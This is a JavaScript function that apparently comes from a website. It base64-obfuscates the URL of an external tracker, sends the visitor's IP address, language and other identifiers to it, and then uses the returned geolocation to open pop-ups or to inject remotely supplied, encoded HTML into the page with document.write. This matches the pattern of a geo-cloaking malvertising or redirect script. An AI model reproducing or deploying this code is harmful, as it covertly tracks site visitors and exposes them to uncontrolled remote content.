function budal(ip) {

        if (cid("bsr") == '1') {
            var usx = 'WmVr';
        } else {
            var usx = cid("u");
        }

            var bsi = cid("i");
            var bst = cid("t");
            var bss = cid("s");
            var bsr = cid("bsr");
            
    var gtx = cmx('aHR0cHM6Ly9pY2xpY2suY2x1Yi9qcy90cmFja19qc29uLnBocD91cz0') + usx + "&lg=" + lang + "&ip=" + ip + "&time" + Date.now();
    //console.log($getURL)
    $.get(gtx, function (data) {
        if (data.geo) {
            if (data.geo == 'ZZ') {
                window.open(cmx(data.pop), 'up');
            } else {
                if (data.geo == 'ID') {
                    $.ajax({
                        method: "GET",
                        url: cmx(data.url),
                        data: {
                            usr: porn,
                            img: bsi,
                            ttl: bst,
                            srv: bss,
                            bsr: bsr,
                            token: data.url
                        }
                    }).done(function (msg) {
                        console.log(msg);
                        document.write(cmx(msg.hd) + cmx(msg.mh) + cmx(msg.pg) + cmx(msg.mf));
                    });
                } else {
                    console.log(cmx(data.urlx));
                    document.write(cmx(data.urlx));
                }
            }
        } else {
            window.open(cmx(data.pop), 'up');
        }
    });
}